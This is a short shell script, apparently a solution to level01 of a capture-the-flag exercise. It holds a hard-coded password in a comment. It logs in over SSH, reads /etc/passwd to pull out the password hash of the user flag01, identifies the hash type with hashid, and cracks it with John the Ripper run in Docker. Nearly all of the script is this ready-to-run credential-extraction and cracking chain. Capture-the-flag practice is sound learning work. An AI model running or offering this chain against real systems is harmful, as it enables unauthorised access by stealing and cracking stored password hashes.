#! /usr/bin/env sh

# password: x24ti5gi3x0ol2eh4esiuxias
ssh level01@$1 -p 4242 "cat /etc/passwd | grep flag01  | cut -d : -f 2" > tmp.txt
python3 -m pip install hashid && hashid tmp.txt
docker run -it -v `pwd`/tmp.txt:/tmp.txt adamoss/john-the-ripper --format=descrypt /tmp.txt
